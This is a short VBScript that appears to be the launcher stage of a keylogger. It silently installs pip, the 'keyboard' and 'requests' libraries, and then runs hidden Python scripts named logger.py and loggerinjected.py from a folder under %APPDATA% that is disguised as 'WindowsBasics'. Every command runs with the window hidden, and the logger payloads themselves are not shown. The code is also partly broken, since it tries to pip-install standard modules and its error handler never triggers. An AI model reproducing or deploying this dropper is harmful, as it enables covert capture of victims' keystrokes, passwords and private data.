Set objShell = CreateObject("WScript.Shell")

objShell.Run "pythonw getpip.py", 0, True
CheckError

objShell.Run "pip install keyboard requests shutil pathlib", 0, True
CheckError

strAppData = objShell.ExpandEnvironmentStrings("%APPDATA%")

strLogger = strAppData & "\WindowsBasics\logger.py"
objShell.Run "pythonw """ & strLogger & """", 0, True
CheckError

strLoggerInjected = strAppData & "\WindowsBasics\loggerinjected.py"
objShell.Run "pythonw """ & strLoggerInjected & """", 0, True
CheckError

Sub CheckError
    If Err.Number <> 0 Then
        WScript.Echo "An error occurred: " & Err.Description
        WScript.Quit(1) 
    End If
End Sub
